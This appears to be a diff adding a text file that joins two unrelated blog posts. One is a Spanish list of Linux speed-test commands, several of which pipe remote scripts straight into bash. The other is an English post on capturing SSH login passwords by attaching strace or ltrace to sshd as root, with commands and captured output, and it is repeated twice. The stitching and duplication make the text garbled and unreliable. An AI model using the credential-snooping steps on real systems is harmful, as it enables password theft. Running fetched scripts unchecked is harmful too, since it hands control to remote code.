@@ -1,0 +1,219 @@
+Comandos en Linux para probar la velocidad de la línea de Internet
+Publicado por Vicente Motos on jueves, 13 de agosto de 2015 Etiquetas: linux , redes , utilidades
+En algunas ocasiones necesitamos hacer pruebas de velocidad e incluso saturar nuestra línea de acceso a Internet para verificar que realmente podemos alcanzar el caudal contratado. Cuando esto ocurre muchas veces no disponemos de otro host remoto detrás de otra línea WAN y acabamos recurriendo a servidores FTP públicos que creemos que tienen buen ancho de banda, a mega.co.nz y hasta la Santísima Trinidad (incluso he visto usar clientes torrent y pensar en usar botnets!).
+
+En esta entrada os voy a listar una serie de comandos para que los podáis copiar y pegar directamente en vuestro terminal y, simplemente desde vuestro equipo Linux (sin tienes dos mejor), podáis conseguir unas pruebas de benchmarking realmente impresionantes, sólo con iperf, wget, curl y poco más. Por supuesto también puedes currarte un sencillo script en shell para impresionar a tu jefe, o meter un while para petar una línea (cuidado con las que estén en producción).
+
+Así que, al menos que quieras aprovechar para bajarte una serie desde la oficina, os recomiendo usar estos comandos contra estos servidores públicos de pruebas disponibles en Internet (por favor, si conoces más servidores públicos no dudes en comentar esta entrada):
+
+Verificar IP pública
+Muy útil para previamente asegurarnos qué línea vamos a comprobar.
+
+curl -s checkip.dyndns.org | sed 's#.*Address: \(.*\)</b.*#\1#'
+wget -qO - icanhazip.com
+curl ifconfig.me
+curl ident.me
+dig +short myip.opendns.com @resolver1.opendns.com
+lynx -dump ifconfig.me | grep 'IP Address'
+curl ipecho.net/plain
+curl bot.whatismyipaddress.com
+curl ipinfo.io
+curl ipogre.com
+
+
+Servicios benchmarking:
+Sitios dedicados o especializados en realizar tests de velocidad
+
+wget dl.getipaddr.net/speedtest.sh -q -O- | bash 
+curl -s dl.getipaddr.net/speedtest.sh -o- | bash
+wget https://raw.github.com/blackdotsh/curl-speedtest/master/speedtest.sh && chmod u+x speedtest.sh && bash speedtest.sh
+wget -O speedtest-cli https://raw.github.com/sivel/speedtest-cli/master/speedtest_cli.py && chmod +x speedtest-cli && ./speedtest-cli
+
+
+Pruebas de descarga:
+Ojo con enviar la descarga directamente a /dev/null si no queréis llenar rápidamente vuestro disco.
+
+CacheFly (Canada):
+
+wget -O /dev/null http://cachecefly.cachefly.net/100mb.test
+
+SoftLayer (EE.UU. y Holanda):
+
+wget -O /dev/null http://speedtest.dal01.softlayer.com/downloads/test100.zip
+wget -O /dev/null http://speedtest.sea01.softlayer.com/downloads/test100.zip
+wget -O /dev/null http://speedtest.ams01.softlayer.com/downloads/test500.zip
+wget -O /dev/null http://50.23.64.58/downloads/test100.zip
+curl -o /dev/null http://speedtest.wdc01.softlayer.com/downloads/test500.zip    
+curl -O http://speedtest.wdc01.softlayer.com/downloads/test10.zip > /dev/null
+wget --output-document=/dev/null http://speedtest.wdc01.softlayer.com/downloads/test500.zip
+echo "scale=2; `curl  --progress-bar -w "%{speed_download}" http://speedtest.wdc01.softlayer.com/downloads/test10.zip -o test.zip` / 131072" | bc | xargs -I {} echo {}Mb\/s
+
+Linode (EE.UU., Reino Unido y Japón):
+
+wget -O /dev/null http://speedtest.tokyo.linode.com/100MB-tokyo.bin
+wget -O /dev/null http://speedtest.london.linode.com/100MB-london.bin
+wget -O /dev/null http://speedtest.newark.linode.com/100MB-newark.bin
+wget -O /dev/null http://speedtest.atlanta.linode.com/100MB-atlanta.bin
+wget -O /dev/null http://speedtest.dallas.linode.com/100MB-dallas.bin
+wget -O /dev/null http://speedtest.fremont.linode.com/100MB-fremont.bin
+
+Leaseweb (EE.UU. y Holanda):
+
+wget -O /dev/null http://mirror.nl.leaseweb.net/speedtest/1000mb.bin
+wget -O /dev/null http://mirror.us.leaseweb.net/speedtest/1000mb.bin
+
+FDCServer (EE.UU.):
+
+wget -O /dev/null http://lg.denver.fdcservers.net/100MBtest.zip
+
+OVH (Francia):
+
+wget -O /dev/null http://proof.ovh.net/files/100Mb.dat
+
+ 
+Pruebas de subida:
+Con el parámetro -r o -d se intentará hacer el test de forma bidireccional. No obstante fallará si tu firewall no permite el NAT de entrada (que es lo normal). Por eso ponemos a iperf en categoría de pruebas de subida/upload.
+
+iperf3 -c iperf.scottlinux.com -u
+iperf3 -c iperf.volia.net -R -P 4
+iperf -c iperf.volia.net -r -P 4
+iperf -c s-network1.amcs.tld -P 1 -i 5 -p 5999 -f B -t 60 -T 1
+iperf -c iperf.acd.net -P 10 -t 240
+iperf -c ping.online.net -i 2 -t 20 -r
+bwctl -T iperf3 -f m -t 10 -i 1 -c ps.ncar.xsede.org
+iperf -c ping.online.net -i 5 -u -r
+iperf -c ping-90ms.online.net -i 5 -u -r
+iperf -c debit.k-net.fr -i 10 -T 100
+iperf -c speedtest.serverius.net
+iperf -c iperf.he.net
+
+
+Stealing Usernames and Passwords from SSHD
+
+I just read a really cool blog post by Sebastian Krahmer. He discusses a post-exploitation technique to snoop on incomming SSH sessions – including the username and password used to authenticate.
+
+Sabastian discusses OpenSSH running with the “Privilege Separation” option turned on (the default).
+
+In this mode several sshd processes are created when an incomming connection is made.  The lower-privileged process needs to send the supplied username and password to the higher-privilged process in order for it to be verified.  It is during this inter-process communication where the snooping occurs.
+
+The proof-of-concept code attaches to the sshd process, waits for it fork, then traps system calls within the child process.  When the child uses the “read” and “write” system calls to commicate with the parent process, the password is revealed.  Screenshots are included in the orginal post.
+
+We can recreate the process using a locally configured ssh daemon, an ssh client and the strace program to trap system calls.
+
+First we connect to the ssh daemon.  This causes it to fork:
+
+$ ssh pm@localhost
+
+Wait for “password:” prompt, then in another session look for the sshd [priv] process.
+
+# ps aux | grep ssh
+root      7015  0.0  0.0  23720   456 ?        Ss   Apr16   0:00 /usr/sbin/sshd
+pm       27870  0.0  0.0  22584  2056 pts/5    S+   19:44   0:00 ssh localhost
+root     27871  0.1  0.0  33476  2172 ?        Ss   19:44   0:00 sshd: pm [priv]
+sshd     27872  0.0  0.0  25060   888 ?        S    19:44   0:00 sshd: pm [net]
+root     27873  0.0  0.0  33476   692 ?        S    19:44   0:00 sshd: pm [pam]
+
+Now strace it (you need to be root).  Then go back to the ssh client type in a password.  You’ll see your password being passed between sshd processes…
+
+# strace -p 27871
+Process 27871 attached - interrupt to quit
+read(6, "???27", 4)                 = 4
+read(6, "4???1???16verysecurepass", 23) = 23
+write(4, "???236", 5)              = 5
+write(4, "???16verysecurepass", 18) = 18
+write(6, "????055", 5)              = 5
+write(6, "???1", 4)                 = 4
+read(6, "???1", 4)                  = 4
+
+The PoC automates this above process.  Very cool.
+What if Privilege Separation isn’t being used?
+
+If Privilege Separation is turned off the above technique doesn’t work because system calls aren’t used to send the unencrypted logon credentials.  It’s possible to see credentials being passed around via library calls using the ltrace tool, though.   The password sent in this example was lots of xxxxx’s:
+
+# ps aux | grep sshd
+ root      7640  0.0  0.0   5128   724 ?        Ss   19:46   0:00 /usr/sbin/sshd
+
+# sudo ltrace -f -p 7640
+...
+[pid 7658] HMAC_Update(0xbfff88d8, 0x80ae4d8, 128, 0x4222f7a0, 0x7a4e3342)           = 1
+[pid 7658] HMAC_Final(0xbfff88d8, 0x80a1260, 0, 0x4222f7a0, 0x7a4e3342)              = 1
+[pid 7658] HMAC_CTX_cleanup(0xbfff88d8, 0x80a1260, 0, 0x4222f7a0, 0x7a4e3342)        = 0xbfff88d8
+[pid 7658] memcpy(0xbfff899b, "=", 1)                                                = 0xbfff899b
+[pid 7658] free(0x80aa708)                                                           = <void>
+[pid 7658] memcpy(0xbfffa984, "", 4)                                                 = 0xbfffa984
+[pid 7658] calloc(1, 4)                                                              = 0x80aa708
+[pid 7658] memcpy(0xbfffa954, "", 4)                                                 = 0xbfffa954
+[pid 7658] malloc(34)                                                                = 0x80b4940
+[pid 7658] memcpy(0x80b4940, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"..., 33)              = 0x80b4940
+[pid 7658] malloc(4096)                                                              = 0x80b8440
+[pid 7658] memcpy(0x80b8440, "", 4)                                                  = 0x80b8440
+[pid 7658] memcpy(0x80b8444, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"..., 33)              = 0x80b8444
+...
+
+So what does it all mean?
+
+If you get root on a box during a pentest, you can snoop on processes.  No surprises or anything new here really.  However, I though it was really cool to see a practical and relatively safe way of automating such snooping – no trojaning of binaries, no risky patching of programs in memory.  Great post Sabastian.Stealing Usernames and Passwords from SSHD
+
+I just read a really cool blog post by Sebastian Krahmer. He discusses a post-exploitation technique to snoop on incomming SSH sessions – including the username and password used to authenticate.
+
+Sabastian discusses OpenSSH running with the “Privilege Separation” option turned on (the default).
+
+In this mode several sshd processes are created when an incomming connection is made.  The lower-privileged process needs to send the supplied username and password to the higher-privilged process in order for it to be verified.  It is during this inter-process communication where the snooping occurs.
+
+The proof-of-concept code attaches to the sshd process, waits for it fork, then traps system calls within the child process.  When the child uses the “read” and “write” system calls to commicate with the parent process, the password is revealed.  Screenshots are included in the orginal post.
+
+We can recreate the process using a locally configured ssh daemon, an ssh client and the strace program to trap system calls.
+
+First we connect to the ssh daemon.  This causes it to fork:
+
+$ ssh pm@localhost
+
+Wait for “password:” prompt, then in another session look for the sshd [priv] process.
+
+# ps aux | grep ssh
+root      7015  0.0  0.0  23720   456 ?        Ss   Apr16   0:00 /usr/sbin/sshd
+pm       27870  0.0  0.0  22584  2056 pts/5    S+   19:44   0:00 ssh localhost
+root     27871  0.1  0.0  33476  2172 ?        Ss   19:44   0:00 sshd: pm [priv]
+sshd     27872  0.0  0.0  25060   888 ?        S    19:44   0:00 sshd: pm [net]
+root     27873  0.0  0.0  33476   692 ?        S    19:44   0:00 sshd: pm [pam]
+
+Now strace it (you need to be root).  Then go back to the ssh client type in a password.  You’ll see your password being passed between sshd processes…
+
+# strace -p 27871
+Process 27871 attached - interrupt to quit
+read(6, "???27", 4)                 = 4
+read(6, "4???1???16verysecurepass", 23) = 23
+write(4, "???236", 5)              = 5
+write(4, "???16verysecurepass", 18) = 18
+write(6, "????055", 5)              = 5
+write(6, "???1", 4)                 = 4
+read(6, "???1", 4)                  = 4
+
+The PoC automates this above process.  Very cool.
+What if Privilege Separation isn’t being used?
+
+If Privilege Separation is turned off the above technique doesn’t work because system calls aren’t used to send the unencrypted logon credentials.  It’s possible to see credentials being passed around via library calls using the ltrace tool, though.   The password sent in this example was lots of xxxxx’s:
+
+# ps aux | grep sshd
+ root      7640  0.0  0.0   5128   724 ?        Ss   19:46   0:00 /usr/sbin/sshd
+
+# sudo ltrace -f -p 7640
+...
+[pid 7658] HMAC_Update(0xbfff88d8, 0x80ae4d8, 128, 0x4222f7a0, 0x7a4e3342)           = 1
+[pid 7658] HMAC_Final(0xbfff88d8, 0x80a1260, 0, 0x4222f7a0, 0x7a4e3342)              = 1
+[pid 7658] HMAC_CTX_cleanup(0xbfff88d8, 0x80a1260, 0, 0x4222f7a0, 0x7a4e3342)        = 0xbfff88d8
+[pid 7658] memcpy(0xbfff899b, "=", 1)                                                = 0xbfff899b
+[pid 7658] free(0x80aa708)                                                           = <void>
+[pid 7658] memcpy(0xbfffa984, "", 4)                                                 = 0xbfffa984
+[pid 7658] calloc(1, 4)                                                              = 0x80aa708
+[pid 7658] memcpy(0xbfffa954, "", 4)                                                 = 0xbfffa954
+[pid 7658] malloc(34)                                                                = 0x80b4940
+[pid 7658] memcpy(0x80b4940, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"..., 33)              = 0x80b4940
+[pid 7658] malloc(4096)                                                              = 0x80b8440
+[pid 7658] memcpy(0x80b8440, "", 4)                                                  = 0x80b8440
+[pid 7658] memcpy(0x80b8444, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"..., 33)              = 0x80b8444
+...
+
+So what does it all mean?
+
+If you get root on a box during a pentest, you can snoop on processes.  No surprises or anything new here really.  However, I though it was really cool to see a practical and relatively safe way of automating such snooping – no trojaning of binaries, no risky patching of programs in memory.  Great post Sabastian.
